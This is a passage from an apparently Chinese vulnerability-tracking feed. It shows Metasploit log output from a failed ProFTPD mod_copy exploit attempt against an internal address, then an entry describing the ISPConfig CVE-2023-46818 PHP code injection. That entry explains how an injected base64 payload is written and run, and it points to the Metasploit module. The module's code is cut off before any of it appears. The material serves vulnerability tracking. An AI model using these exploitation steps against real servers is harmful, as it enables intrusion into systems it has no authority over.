class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs nix">[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_ssl</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/custom</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_aws_ssm</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">52</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">57</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out. <span class="hljs-operator">-</span> Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out.<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">10</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/bind_aws_instance_connect</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/bind_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_ssl</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter/reverse_tcp_uuid</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_http</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_https</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module cmd<span class="hljs-symbol">/unix/python/meterpreter_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/custom</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_aws_ssm</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_bind_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">11</span>] [d(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Module generic<span class="hljs-symbol">/shell_reverse_tcp</span> is incompatible <span class="hljs-keyword">with</span> unix<span class="hljs-symbol">/ftp/proftpd_modcopy_exec</span> for <span class="hljs-params">PayloadType:</span> limiter was cmd<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">16</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">16</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">22</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">22</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">43</span>:<span class="hljs-number">22</span>] [w(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> <span class="hljs-params">Warning:</span> trying to report a session_event for a session <span class="hljs-keyword">with</span> no db_record (<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure></details><h3 id="Web-Service-Logs"><a href="#Web-Service-Logs" class="headerlink" title="Web Service Logs"></a>Web Service Logs</h3><p>The following web service logs were recorded before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">msf-ws.<span class="hljs-built_in">log</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> exist.<br></code></pre></td></tr></table></figure></details><h3 id="Version-Install"><a href="#Version-Install" class="headerlink" title="Version&#x2F;Install"></a>Version&#x2F;Install</h3><p>The versions and install method of your Metasploit setup:</p><details><summary>Collapse</summary><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Framework</span>: <span class="hljs-number">6</span>.<span class="hljs-number">4</span>.<span class="hljs-number">55</span>-dev-<br><span class="hljs-attribute">Ruby</span>: ruby <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">26</span> revision <span class="hljs-number">31</span>d0f1a2e7)<span class="hljs-meta"> [x86_64-linux]</span><br><span class="hljs-attribute">OpenSSL</span>: OpenSSL <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>t  <span class="hljs-number">7</span> Feb <span class="hljs-number">2023</span><br><span class="hljs-attribute">Install</span> Root: /opt/metasploit-framework/embedded/framework<br><span class="hljs-attribute">Session</span> Type: Connected to msf. Connection type: postgresql.<br><span class="hljs-attribute">Install</span> Method: Omnibus Installer<br></code></pre></td></tr></table></figure></details>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ProFTPD 1.3.5 mod_copy模块命令执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入</title>
    <link href="http://example.com/2025/06/30/github_938639146/"/>
    <id>http://example.com/2025/06/30/github_938639146/</id>
    <published>2025-06-30T15:45:21.338Z</published>
    <updated>2025-06-30T15:45:21.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ISPConfig的language_edit.php文件存在PHP代码注入漏洞。当<code>admin_allow_langedit</code>设置启用时，经过身份验证的管理员可以通过语言编辑器界面注入任意PHP代码。该模块会自动检查<code>admin_allow_langedit</code>权限是否启用，并尝试启用它（需要具有系统配置访问权限的管理员凭据）。漏洞利用通过将PHP有效负载注入语言文件，然后在访问该文件时执行。有效负载使用PHP的file_put_contents函数进行base64编码并写入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/47f2ba2861e1f8d14f7e2e2378d1a55052381dc2/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/47f2ba2861e1f8d14f7e2e2378d1a55052381dc2/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span 